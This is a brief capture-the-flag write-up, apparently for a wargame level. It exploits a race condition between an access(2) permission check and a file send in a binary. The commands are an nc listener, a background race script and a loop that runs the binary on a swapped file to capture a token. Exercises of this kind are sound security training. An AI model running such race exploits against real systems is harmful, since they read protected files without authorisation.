Analyzing the binary, we can see that before sending the file permissions are checked using access(2)
No other exploitation vector seems apparent.

Fortunately for us, `man access(2)` reveals a known race condition
We copy race.sh to /tmp and:
$ nc -lk 6969
And on another shell
$ bash /tmp/race.sh&
$ while true; do ./level10 /tmp/pwny 127.0.0.1; done

We now have the token for flag10
